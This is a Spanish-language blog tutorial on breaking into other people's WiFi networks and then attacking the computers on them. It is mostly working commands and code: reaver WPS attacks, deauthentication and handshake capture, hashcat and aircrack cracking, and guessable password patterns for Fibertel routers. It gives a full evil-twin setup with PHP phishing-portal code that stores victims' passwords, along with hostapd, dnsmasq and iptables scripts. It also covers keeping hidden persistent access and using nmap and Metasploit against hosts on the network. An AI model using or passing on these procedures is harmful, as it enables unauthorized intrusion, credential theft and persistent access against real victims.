---
title: "Atacando redes WiFis y explotando vulnerabilidades de computadoras dentro ellas."
date: 2024-07-21T19:48:09-03:00
tags: ['atacando','redes','ciberseguridad','vulnerabilidades']
---
Tools dedicadas a conseguir handshakes: handshaker, airgeddon, bettercap, angryoxide, etc, etc. Incluso hasta pasarlo por pyrit para verificarlo. 

---


No te hace falta usar espacio de disco almacenando diccionarios.
Abris un simple .txt en blanco y dentro le pones

```bash
004?d?d?d?d?d?d?d
014?d?d?d?d?d?d?d
```

Lo guardas como `004y014mas7.hcmask`. Despues solo resta correr hashcat.

```bash
hashcat -O --markov-threshold=0 -m 22000 -a 3 mi_hash.HC22000  004y014mas7.hcmask -w
```



---

Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y
es para cualquier distro.


```bash
sudo reaver -i wlan0 -b mac_address -c canal -K 1 -Z -vvv
```

Si te falla pasamos a:


```bash
sudo reaver -i wlan0 -b mac_address -c canal -S -N -L -d 10 -r 3:15 -T .5 -vv
```

Hoy saque una de las nuevas de Personal en 5 segundos usando el segundo comando.

Por favor, SIEMPRE prueben antes ataques via reaver antes de pasar a otros mas complejos.

---

https://github.com/Ragnt/AngryOxide

User Guide:    
https://github.com/Ragnt/AngryOxide/wiki/1.-User-Guide

Es tremendamente explicativa la wiki, como se lanza, las opciones a ejecutar, etc.

Yo lo dejo corriendo mínimo media hora, mientras va creando un archivo pcapng con el
nombre que le hemos asignado, los .hc22000 validos conseguidos y un file .kismet.
Para cortarlo presionamos q y los comprime en un solo .tar.gz. Si el pcapng supera
los 100 mb, automaticamente comprime ese pero sigue creando uno nuevo.
pero nada de otro mundo.

---

#### Airgeddon captura handshakes rotos es mejor usar hcxdumptool
Quizás en un futuro mejore, pero hasta ahora es así.

Bajate BlackArch, KaliLinux o si tenés Arch agregale el repo de BlackArch. (Si no queres el repo de BlackArch podes instalar las depedencias del AUR)
Instalá wifite, airgeddon, fluxion.

Si querés usar airgeddon sin interfaz gráfica: 
```bash
sudo su
export AIRGEDDON_WINDOWS_HANDLING=tmux
airgeddon
```

###### En ArchLinux instalar `airgeddon`:
```bash
yay -S airgeddon crunch asleap beef-xss hostapd-wpe
pacman -S hostapd lighttpd hcxtools bettercap ettercap bully pixiewps  hashcat tcpdump ettercap wireshark-cli mdk4 hcxdumptool reaver  john dhcp
```

Más info acá: https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Options


```bash
sudo wifite
sudo airgeddon
```

Podés capturar el handshare y intentar romperlo usando diccionarios, fuerza bruta con airgeddon, creando gemelo malvado. Podes crear diccionarios específicos así:

crunch 10 10 0123456789 hex -o START -t sakura@@@@

Y luego usarlos con aircrack como se demuestra más abajo.

---

Primero de todo: [Problemas comunes con airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/FAQ-&-Troubleshooting)
### Puede ser que tu tarjeta de red no soporte el tipo de ataque "gemelo malvado" porque tiene que ser capaz de "dividir" la tarjeta fisica en 2 tarjetas logicas como se explica acá:
# ¿Qué es VIF?
VIF (Interfaz virtual) es la capacidad de dividir una tarjeta física en 2 tarjetas lógicas. Esto se utiliza durante los ataques de Evil Twin para que uno actúe como AP y el otro realice DoS en modo monitor. Desde airgeddon>=10.42 hay un control integrado para esto antes de lanzar cualquier ataque de Evil Twin.

Para verificar manualmente si su tarjeta es compatible con VIF, ejecute este comando `sudo iw list | grep "Supported interface modes" -A 8` (este comando distingue entre mayúsculas y minúsculas y si se escribe mal dará como resultado una salida incorrecta o ninguna) y debería ver en la salida AP/VLAN (solo AP no es suficiente), de lo contrario, su La tarjeta no admite el VIF requerido.

Por lo general, los conjuntos de chips Realtek (RTL) no tienen capacidad VIF y no se recomiendan para piratería inalámbrica. No los confunda con los conjuntos de chips Ralink (RT), estos últimos suelen ser compatibles y recomendados con VIF. Consulte la lista de chipsets/tarjetas compatibles con VIF en pleno funcionamiento [acá](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Cards-and-Chipsets).

Si tiene más de una tarjeta wifi y ninguna admite VIF o es una tarjeta o chipset en la lista negra, pero al menos una admite el modo AP y ambas admiten el modo monitor, puede intentar usar este [plugin](https://github.com/xpz3/airgeddonplugins/blob/main/multint.sh) para usar 2 tarjetas en airgeddon en lugar de una tarjeta compatible con VIF. . Uno para el AP falso y otro para realizar DoS. Puede encontrar información sobre el uso de complementos [acá](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Plugins%20System).

Acá están las tarjetas en la lista negra: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Cards%20and%20Chipsets](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Cards%20and%20Chipsets)

Obtené información de tu tarjeta de red con el siguiente comando: `lspci -nnk | grep -A2 0280` o `sudo lshw -C network`

### 1er método: WPS attack y captura de handshake con wifite
Usando wifite lo hace todo automáticamente ejecuta ataques de WPS y captura el handshake y e intenta descubrir la contraseña con un diccionario, sólo tenés que elegir la red a atacar.

### 2do método: Capturá el handshake con airgeddon
Capturá el handskake (el archivo que contiene la contraseña cifrada)
```
sudo airgeddon
```
### Pasos:
1. Seleccioná la interfaz wlan0
2. Ponela en modo monitor (2)
3. Ahora tenés la opción de capturar el handshake con la opcion 5 o hacer un ataque de gemelo malvado con la opcion 7. Para hacer el ataque del gemelo malvado necesitas capturar el handshake. Si selecionás la opción 7 lo hace todo en uno.
4. Vamos a capturar el handshake apretá 5.
5. Ponelo en monitor mode con 2 si te olvidaste de hacerlo en el paso anterior.
6. Dale a la opcion 6.
7. Ahí comenzará a escanear por redes, cuando veas la red que querés atacar cerrá la ventana con Alt+F4 , ahora los nombres que aparecen en amarillo son las redes que tienen clientes. Seleccioná cual red desees atacar.
8. Tenés que elegir el método para desautenticar al cliente, esto es necesario porque solo podemos capturar el handshake cuando el cliente se conecta al wifi, cuando ya está conectado no podemos hacerlo.
Elegí cualquiera de las 3, el que más me ha funcionado es la 1era opción: `deauth / disassoc amok mdk4 attack`
9. Ahora sólo queda esperar, el handshake capturado se guardará en `/root/handshake-....cap`, luego necesitarás para hacer el ataque de gemelo malvado.

Usá el diccionario rockyou.txt que viene en kalilinux o bajalo.

Si estás en kali ejecutá wordlists.
Y te tira el directorio en donde está rockyou.txt.gz tenes que descomprimirlo

Intentá descubrir la contraseña con un diccionario ejecutando este comando:

```
sudo aircrack-ng -w rockyou.txt /root/handshake-MAC.cap
```

# 3er método: wifiphisher (Evil twin)
Es todo automático. Crea un punto de acceso falso con el mismo nombre del wifi de la víctima para engañarlo haciéndola creer que su WiFi. Ejecutálo como root elegí el SSID y esperá a la victima. Es una técnica más de "ingeniería social" porque es como salir a pescar. Pero a diferencia de hacer un ataque de evil twin con airgeddon o fluxion no usa el handshake, el handshake se utiliza para verificar si la contraseña que te dió la víctima es correcta.


# 4to método: Evil Twin (fluxion o airgeddon)
El metodo gemelo malvado consiste en crear varias redes wifis con el mismo nombre deautentica al usuario y le hace creer que su internet no funciona te conectás a mi wifi creyendo que es la tuya y te tira un mensaje de que el firmware se está actualizando y te pido la contraseña, es un ataque más de ingeniería social. Pero funciona.
Este ataque se puede realizar con `fluxion` o con `airgeddon` 


### 5to método: Lo mismo pero en vez de usar scripts, lo hacemos todo a mano.
#### NO ES RECOMENDADO. PORQUE SIMULTANEAMENTE TENÉS QUE HACER UN ATAQUE DoS EN MODO MONITOR Y LEVANTAR UN PUNTO DE ACCESO, ACÁ NO TE ENSEÑARÉ COMO HACERLO EN SIMULTÁNEO, PARA ESO ESTÁ EL SCRIPT AIRGEDDON Y FLUXION. Quizás sea mejor tener dos tarjetas en este caso.

Instalá apache y bajo `/var/www/html` creá un archivo llamado `passwords.txt`  

index.php:
```php
<?php
	
	if(isset($_POST['button'])){
		if(isset($_POST['password']) && !empty($_POST['password'])){
			$password = $_POST['password'];
			echo 'Please wait for validation of password key: '.$password.'<br>';
			$fp =fopen('passwords.txt', 'a');
			fwrite($fp, $password);
			fwrite($fp, "\n");
			fclose($fp);
		}else {
			echo "Wifi password cannot be empty<br>";
		}
	}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Wifi Service</title>
  <style>
    body{
      font-family: Arial, Helvetica, sans-serif;
      text-align: center;
      background-color:  #d5dbdb ;
      padding: 20px;
     
    }
    button{
		padding: 10px;
	}
	#connecting{
		visibility: hidden;
	}
   
  </style>
</head>
<body>
  <div id="password-form">
      <img src="/wifi-icon3.png" alt="" width="180vw">
      
      <p>Your wifi key needs to be revalidated for security reasons.</p> 
     
	  <form method="post" action="index.php" id="mform"> 
		<p>Please enter your modem's WPA wifi key to connect to the Internet: </p>
		<input type="text" name="password" size="35%">
		<p><input type="submit" name="button"  value="Connect"></p>
	  </form> 
  </div>
	
</body>
</html>
```
Guardá este ícono con el mismo nombre en `/var/www/html`

![/img/wifi-icon3.png](/img/wifi-icon3.png)
Al archivo PHP llamalo index.php y dale permisos de escritura y lectura con `chmod -R 777 index.php`

### Ejecutá el servidor.
`service apache2 start`

La contraseña se guardará en `passwords.txt`

Con `ip a` obtené tu dirección IP local.

### Instalá `hostapd` y `dnsmasq`
`sudo apt install -y hostapd dnsmasq`
Usá estos archivos de configuración para el dnsmasq y el hostapd


#### dnsmasq.conf
```console
#Set the wifi interface
interface=wlan0

#Set the IP range that can be given to clients
dhcp-range=10.0.0.10,10.0.0.100,8h

#Set the gateway IP address
dhcp-option=3,10.0.0.1

#Set dns server address
dhcp-option=6,10.0.0.1

#Redirect all requests to 10.0.0.1
address=/#/10.0.0.1
```

#### hostapd.conf
```console
#Set wifi interface
interface=wlan0

#Set network name
ssid=iot-lab

#Set channel
channel=1

#Set driver
driver=nl80211
```

#### Detenemos el servicio de network manager
```bash
sudo su
service network-manager stop # En algunas distros es NetworkManager
airmong-ng check kill # Para comprobar que fue detenido
```

Con el dnsmasq vamos a redireccionar todo el tráfico a `10.0.0.1`.

### Configuramos para que nuestra ip sea 10.0.0.1/24
Donde `/24` indica que los primeros 24 bits son bits de red, dejando los 8 bits restantes para direcciones de host dentro de ese bloque.


En la mayoría de distros ifconfig ya está obsoleto y tendrás que usar el comando `ip`:  
```console
ifconfig wlan0 10.0.0.1/24
ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
```

Ejecutá ifconfig para comprobar que se guardó la configuración.

```bash
route -n
route add default gw 10.0.0.1 # gw hace referencia a gateway
route -n # Para confirmar que se agregó la ruta
```

Ahora ejecutamos dnsmasq con el archivo de configuración mostrado anteriormente.
```bash
sudo dnsmasq -C /root/eviltwinfiles/dnsmasq.conf
```

Y creamos el punto de acceso WiFi.
```bash
sudo hostapd /root/eviltwinfiles/hostapd.conf
```

Luego ejecutamos el servidor apache en donde contiene nuestro portal captivo.

```bash
sudo us
service apache start
```

Ahora si te conectás a la WiFi todos las contraseñas que ingresen a través de ese portal se guardaran en `passwords.txt`

Cuando entres a tu WiFi falsa e intentes ingresar a gmail.com y facebook.com no te redireccionará a tu portal cautivo porque usan el protocolo HSTS.

#### Para detener el ataque:  
```console
service hostapd stop
service dnsmasq stop
service apache2 stop
service rpcbind stop
killall dnsmasq # o pkill dnsmasq
killall hostapd # o pkill hostapd
netstat -tan # Para confirmar que los servicios se hayan detenido.
``` 

### Iniciar networkmanager
```console
service network-manager start
```
Y listo ya deberías haber detenido el ataque y volver a tener internet.


### Como implementar SSL para sitios con protocolo HSTS como facebook y gmail.
Usá este archivo de configuración de apache (`/etc/apache2/sites-available`)
ports.conf:
```console
# If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default.conf

Listen 80
Listen 443

```

Ahora copia esta configuración de 000-default.conf en tu apache
000-default.conf
```console
<VirtualHost *:80>
	ErrorDocument 404 /
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
</VirtualHost>

<VirtualHost *:443>
	SSLEngine On
	SSLCertificateFile /root/certs/cert.pem
	SSLCertificateKeyFile  /root/certs/cert.key
</VirtualHost>

<Directory "/var/www/html">
	RewriteEngine On
	RewriteBase /
	RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
	RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
	
	RewriteCond %{REQUEST_FILENAME} !-f
	RewriteCond %{REQUEST_FILENAME} !-d
	RewriteRule ^(.*)$ / [L,QSA]
</Directory>
```

Ahora ejecutá 
```console
sudo su
mkdir /root/certs/
openssl req -new -x509 -days 365 -out /root/certs/cert.pem -keyout /root/certs/cert.key # Usá la contraseña 123456, en ciudad, localidad, provincia, nombre de organización, email poné cualquier cosa.

### Habilitá los módules en el servidor de apache
a2enmod rewrite  
a2enmod ssl
systemctl restart apache
```

Ejecutá `netstat -tan` para comprobar que el puerto 443 esté a la escucha.
Ahora intentá ingresar a `https://localhost`


Este es un script que resume lo que vinimos haciendo, para iniciar el ataque ejecuten:

fake-ap-start.sh:
```console
#!/bin/sh

service network-manager stop
airmon-ng check kill
ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
route add default gw 10.0.0.1

echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT

dnsmasq -C /root/eviltwinfiles/dnsmasq.conf
hostapd /root/eviltwinfiles/hostapd.conf -B
service apache2 start
```

Ahora si nos conectamos a nuestra WiFi falsa e ingresamos a gmail, yahoo, o facebook nos va a redirigir a nuestro portal cautivo, en donde la victima ingresará su contraseña y se guardará en `/var/www/html/passwords.txt`

Podés ejecutar este script para detener el ataque.

fake-ap-stop.sh
```bash
#!/bin/sh

service hostapd stop
service apache2 stop
service dnsmasq stop
service rpcbind stop
killall dnsmasq
killall hostapd
```

Luego `service network-manager start`
Y tu internet debería volver a funcionar.


### Capturando el handshake con Airodump
**¿Qué es el handshake?**
Una serie de 4 paquetes intercambiados entre el cliente y el punto de acceso durante un establecimiento de conexión. El handshake contiene la contraseña cifrada. Sólo podemos capturar el handshake cuando el cliente se conecta a la WiFi, no cuando ya está conectado.

```bash
service network-manager stop
airmon-ng check kill # comprobamos que se mató el proceso
airmon-ng start wlan1 # o wlan0 para ponerlo en modo monitor, en modo monitor tu internet dejará de funcionar, salvo que tengas dos antenas wifi.
iwconfig
airmon-ng stop wlan1mon # Para detener el modo monitor
airodump-ng wlan1mon # Para escuchar paquetes (tiene que estar en modo monitor) de ahí elegí la mac address de cualquier red para usarla en el siguiente comando.

Ahora podemos crear una carpeta para guardar el handshake
```console
mkdir handshake
cd handshake
```
### Escuchamos para capturar el handshake
`airodump-ng wlan1mon --bssid 1C:5F:2B:E7:77:EA --channel 11 --write handshake --output-format cap`

Cuando el handshake es capturado se guardará en el directorio en donde estás situado.

### Deautenticamos a los clientes para que se vuelvan a conectar y así capturar el handshake. (Simultáneamente)
`aireplay-ng --deauth 0 -a 1C:5F:2B:E7:77:EA -c 40:E2:30:CC:1E:8D wlan1mon # donde -a es el SSID y -c es el cliente.`

O podés hacerlo sin el cliente `sin la opción -c` pero agregando `-D` 

### Una vez que capturamos el handshake, intentamos descubrir la contraseña usando un diccionario.
`aircrack-ng handshake.cap -w passwords.txt`

En KaliLinux hay un diccionario muy conocido que se llama rockyou.txt y otros diccionarios que se pueden ver ejecutando el comando `wordlists`.
```


### Detener la captura del handshake:
```bash
sudo airmon-ng stop wlan1mon (detiene el modo monitor de la wifi)
service network-manager start
```


### Ataque de deautenticacion y portal cautivo.

```bash
sudo su
service network-manager stop
airmon-ng check kill
airodump-ng start wlan0mon
iwconfig # Para verificar que nuestra wlan0 esté en monitor mode.
airodump-ng wlan0mon
```
Ahora arriba apareceran los SSID y abajo los clientes conectados a esas SSID

```bash
airodump-ng wlan0mon --bssid direccion_mac_encontrada_con_el_comando_anterior --channel numero_del_canal_encontrado_en_el_comando_anterior
```
Así encontraremos los clientes conectados a esa WiFi.

Ahora los deautenticamos.
```bash
aireplay-ng --deauth 0 -a 1C:5F:2B:E7:77:EA -c 40:E2:30:CC:1E:8D wlan1mon
```

Ahora ejecutamos nuestro fake-ap-start.sh

Para detenerlo `fake-ap-stop.sh` y luego service `network-manager start`

### Una vez que conseguimos el acceso a la wifi, no deberíamos perderlo más.
Una técnica para no perder el acceso puede ser levantar una red wifi invitado OCULTA no difundas el SSID (guest network) y habilitar acceso a través de WPS por PIN.

## Hackeando computadoras una vez que conseguiste el acceso
Una vez que conseguimos el acceso a la WiFi, estaría bueno tener acceso también a las computadoras por si las dudas en un futuro cambian la contraseña. Para ello utilizaremos metasploit.
Primero hacemos un escaneo de todas las PCs conectadas a esa WiFi con el siguiente comando.

### Escanea todas las computadoras conectadas a esa wifi 
[https://archive.is/wip/vBAQq](https://archive.is/wip/vBAQq)

```bash
nmap -sP 192.168.1.0/24 # Generalmente es 192.168.1 pero puede variar mirá tu ip con el comando ip a
```
### O usando metasploit:
```bash
msfconsole
msf > use auxiliary/scanner/discovery/arp_sweep
msf auxiliary(arp_sweep) > set RHOSTS 192.168.1.1/24
```


Más información: [https://thelinuxcode.com/scan-vulnerabilities-metasploit/](https://thelinuxcode.com/scan-vulnerabilities-metasploit/)   
Archive: [https://archive.is/wip/JgyL7](https://archive.is/wip/JgyL7)

Ahora detectemos que sistema operativo están ejecutando esas computadoras (Android, Windows o Linux para poder encontrar una vulnerabilidad para ese sistema operativo)

Existen varios métodos: 
[https://archive.is/wbYBK](https://archive.is/wbYBK)

```bash
nmap -sS -O IPs_VICTIMAS_SEPARADAS_POR_ESPACIOS
```

O hacé un escaneo masivo usando: `$ nmap -T4 -A 192.168.0.0/24`


Acá tienen una lista de comandos de tipos de escaneos que pueden realizar con nmap:
[https://archive.is/wip/VisbY](https://archive.is/wip/VisbY)
```console
$ curl cheat.sh/
# Single target scan:
nmap [target]

# Scan from a list of targets:
nmap -iL [list.txt]

# iPv6:
nmap -6 [target]

# OS detection:
nmap -O --osscan_guess [target]

# Save output to text file:
nmap -oN [output.txt] [target]

# Save output to xml file:
nmap -oX [output.xml] [target]

# Scan a specific port:
nmap -source-port [port] [target]

# Do an aggressive scan:
nmap -A [target]

# Speedup your scan:
# -n => disable ReverseDNS
# --min-rate=X => min X packets / sec
nmap -T5 --min-parallelism=50 -n --min-rate=300 [target]

# Traceroute:
nmap -traceroute [target]

# Ping scan only: -sP
# Don't ping:     -PN <- Use full if a host don't reply to a ping.
# TCP SYN ping:   -PS
# TCP ACK ping:   -PA
# UDP ping:       -PU
# ARP ping:       -PR

# Example: Ping scan all machines on a class C network
nmap -sP 192.168.0.0/24

# Force TCP scan: -sT
# Force UDP scan: -sU

# Use some script:
nmap --script default,safe

# Loads the script in the default category, the banner script, and all .nse files in the directory /home/user/customscripts.
nmap --script default,banner,/home/user/customscripts

# Loads all scripts whose name starts with http-, such as http-auth and http-open-proxy.
nmap --script 'http-*'

# Loads every script except for those in the intrusive category.
nmap --script "not intrusive"

# Loads those scripts that are in both the default and safe categories.
nmap --script "default and safe"

# Loads scripts in the default, safe, or intrusive categories, except for those whose names start with http-.
nmap --script "(default or safe or intrusive) and not http-*"

# Scan for the heartbleed
# -pT:443 => Scan only port 443 with TCP (T:)
nmap -T5 --min-parallelism=50 -n --script "ssl-heartbleed" -pT:443 127.0.0.1

# Show all informations (debug mode)
nmap -d ...

# Scan for available SSH connections (use root for additional output)
nmap -p 22 192.168.0.0/24

## Port Status Information
- Open: This indicates that an application is listening for connections on this port.
- Closed: This indicates that the probes were received but there is no application listening on this port.
- Filtered: This indicates that the probes were not received and the state could not be established. It also indicates that the probes are being dropped by some kind of filtering.
- Unfiltered: This indicates that the probes were received but a state could not be established.
- Open/Filtered: This indicates that the port was filtered or open but Nmap couldn’t establish the state.
- Closed/Filtered: This indicates that the port was filtered or closed but Nmap couldn’t establish the state.

## Additional Scan Types

nmap -sn: Probe only (host discovery, not port scan)
nmap -sS: SYN Scan
nmap -sT: TCP Connect Scan
nmap -sU: UDP Scan
nmap -sV: Version Scan
nmap -O: Used for OS Detection/fingerprinting
nmap --scanflags: Sets custom list of TCP using `URG ACK PSH RST SYN FIN` in any order

### Nmap Scripting Engine Categories
The most common Nmap scripting engine categories:
- auth: Utilize credentials or bypass authentication on target hosts.
- broadcast: Discover hosts not included on command line by broadcasting on local network.
- brute: Attempt to guess passwords on target systems, for a variety of protocols, including http, SNMP, IAX, MySQL, VNC, etc.
- default: Scripts run automatically when -sC or -A are used.
- discovery: Try to learn more information about target hosts through public sources of information, SNMP, directory services, and more.
- dos: May cause denial of service conditions in target hosts.
- exploit: Attempt to exploit target systems.
- external: Interact with third-party systems not included in target list.
- fuzzer: Send unexpected input in network protocol fields.
- intrusive: May crash target, consume excessive resources, or otherwise impact target machines in a malicious fashion.
- malware: Look for signs of malware infection on the target hosts.
- safe: Designed not to impact target in a negative fashion.
- version: Measure the version of software or protocols on the target hosts.
- vul: Measure whether target systems have a known vulnerability.

 tldr:nmap 
# nmap
# Network exploration tool and security / port scanner.
# Some features only activate when Nmap is run with root privileges.
# More information: <https://nmap.org>.

# Check if an IP address is up, and guess the remote host's operating system:
nmap -O ip_or_hostname

# Try to determine whether the specified hosts are up (ping scan) and what their names are:
nmap -sn ip_or_hostname optional_another_address

# Also enable scripts, service detection, OS fingerprinting and traceroute:
nmap -A address_or_addresses

# Scan a specific list of ports (use '-p-' for all ports from 1 to 65535):
nmap -p port1,port2,...,portN address_or_addresses

# Perform service and version detection of the top 1000 ports using default NSE scripts; writing results ('-oN') to output file:
nmap -sC -sV -oN top-1000-ports.txt address_or_addresses

# Scan target(s) carefully using 'default and safe' NSE scripts:
nmap --script "default and safe" address_or_addresses

# Scan web server running on standard ports 80 and 443 using all available 'http-*' NSE scripts:
nmap --script "http-*" address_or_addresses -p 80,443

# Perform a stealthy very slow scan ('-T0') trying to avoid detection by IDS/IPS and use decoy ('-D') source IP addresses:
nmap -T0 -D decoy1_ipaddress,decoy2_ipaddress,...,decoyN_ipaddress address_or_addresses

```


Otro tutorial para detectar el sistema operativo de tu víctima usando metasploit  
[OS fingerprinting with Metasploit](https://archive.is/wip/MHXYg)

Dependiendo del sistema operativo que usen y los puertos abiertos tenemos millones de exploits para elegir. Por torrent usando qbittorrent y jackket también podemos encontrar diferentes técnicas para vulnerar Windows 7/8/10. Una de las vulnerabilidades que recuerdo es en el protocolo SAMBA. En YouTube hay miles de videos (muchos borrados sobre como acceder a computadoras con Windows). 

Ejemplo detectar sistema operativo de una PC
```bash
sudo msfconsole
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.100.28
set threads 50
show options 
set PORTS 445 # opcional
set PORTS 1-65535 # opcional
run
```
Si el puerto 445 está abierto haremos lo siguiente.

```bash
use scanner/smb/smb_version
set RHOSTS 192.168.100.28
run
```
Y nos dirá que versión de **Windows** es

O usamos portscan tcp
```bash
sudo msfconsole
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.100.28 # pc victima
set threads 20
show options 
set PORTS 1-65535 # opcional
run
```


### Como usar metasploit para escanear vulnerabilidades.
```console
service postgreqsql start 
msfdb init
msfconsole
db_nmap -v -sV 192.168.0.120
db_nmap -sS -Pn -A 192.168.0.120
use scanner/ssh/ssh_version 
set RHOSTS 192.168.0.120 
set THREADS 50 
run
search name:httpd
```

### NMAP Escanear por vulnerabilidades.
```bash
nmap -Pn --script vuln <<Target_computer_ip_address>>
```
### Buscamos vulnerabilidades con metasploit
```bash
search vuln
# Seleccioná tu vulnerabilidad
use auxiliary/scanner/...
```
## Algunos otros escáneres de vulnerabilidades comunes en Metasploit son:

1. Escáneres SMB: busque MS17-010, CVE-2020-0796, etc.
`use auxiliary/scanner/smb/smb_ms17_010`
2. Escáneres FTP: compruebe si hay vulnerabilidades FTP como la puerta trasera vsftpd. `use auxiliary/scanner/ftp/ftp_version`
3. Escáneres SMTP: pruebas de autenticación EXIM, problemas de TLS, etc.
`use auxiliary/scanner/smtp/smtp_enum`
4. Escáneres SSH: detectan algoritmos de cifrado débiles.
`use auxiliary/scanner/ssh/ssh_cipher_enum`
5. Escáneres de bases de datos: inyección de SQL, credenciales débiles, etc.
`use auxiliary/scanner/mssql/mssql_ping`


Acá dejo un tuto: 
[Samba Server Exploitation Using NMAP and Metasploit](https://archive.is/MLuUs)

### Vulnerá Windows con Metasploit
[https://youtube.com/watch?v=y4-oIl6bkbE](https://youtube.com/watch?v=y4-oIl6bkbE)  
[https://youtube.com/watch?v=4PGjyKhYzdY](https://youtube.com/watch?v=4PGjyKhYzdY)

### Playlist sobre metasploit.
Y acá una guía de metasploit:
[https://youtube.com/playlist?list=PLBf0hzazHTGN31ZPTzBbk70bohTYT7HSm](https://youtube.com/playlist?list=PLBf0hzazHTGN31ZPTzBbk70bohTYT7HSm)


Google y YouTube borraron miles de videos de hacking así que pueden buscar tutoriales sobre metasploit también por torrent usando qBittorrent y jackket.

Si capturaron el handshake y tienen una computadora muy lenta lo pueden subir a arg-wireless y le correrán un diccionario.

### Ejemplos

Salio la clave. Antes por ataque de WPS pude descubrir que uso una palabra y 4 numeros. Entonces baje el diccionario de latin en weakpass y filtre las palabras que contengan EXACTAMENTE 4 numeros al final con `grep`, si alguno sabe una mejor forma de hacer esto diganme. De un diccionario de 11 gigas pase a uno de 1,7 gigas. En 3 dias salio clave solo con CPU (`Intel Celeron 2.0GHz`)

```
grep -E '\b([^0-9]*[0-9]){4}$[^0-9]*\b' weakpass_4.latin.txt > sanchez_dicc1
grep -E '^[^0-9]*([0-9]){4}$' sanchez_dicc1 > sanchez_dicc2
```

```bash
aircrack-ng -w sanchez_dicc2 /home/esotericwarfare/Sanchez1/handshake-FE:A0:3F:21:00:91.cap
```

#### Observación

Supongamos que corremos el diccionario de 46 gigabytes o hacemos un ataque de gemelo malvado o hacemos un ataque de WPS o hacemos un ataque de WEP (obsoleto) y encontramos que la contraseña es: sakura2629

Ahora ya conocemos el patrón de la contraseña.

Entonces tomamos un diccionario de 46 gigas y aplicamos los siguientes filtros:

1. Cómo mínimo la contraseña tiene que ser 8 caracteres.
2. Solo nos quedamos con las palabras que tengan exactamente 4 números AL FINAL.

3. Creamos 3 diccionarios:
* Solo nos quedamos con las palabras que contengan sakura: menos de 1 megabyte.
* Solo nos quedamos con las palabras que contengan 26: aprox. 500 megabytes que lo podés probar en 3 horas.
* Solo nos quedamos con las palabras que contengan 29: aprox. 500 megabytes que lo podés probar en 3 horas.

Es decir de un diccionario de 46 gigabytes nos quedamos con 3 diccionarios que lo podemos probar en menos de 1 día.

#### Fibertel WiFi xxx
https://imlauera.github.io/crackear_fibertel/

```bash
004+DNI
004+DNI+abc
004+DNI+w1f1
004+DNI+xxx
003+DNI+xxx
001+DNI+xxx
002+DNI+xxx
014+DNI+xxx
420+DNI+xxx
412+DNI+xxx
...
```


#### Besside-ng (solo sirve para WPA)
```bash
sudo su
airmon-ng check kill
airmon-ng start wlp1s0
airodump-ng wlp1s0
besside-ng -b BBSID
``` 


#### More hacking

```console
sudo su
airmon-ng check kill
airmon-ng start wlp1s0
airodump-ng wlp1s0
sudo airodump-ng -w wificapture -c NUMERO_CANAL --bssid ... wlp1s0 # wificapture para capturar el handshake
sudo aireplay-ng -D --deauth 0 -a BSSID_NETWORK wlp1s0 # Si no pones el cliente tenes que agregar la opcion -D
wireshark wificapture-01.cap
sudo airmon-ng stop wlp1s0 
```

### wifite
```bash
wifite
```

Saludos, que Dios los bendiga.
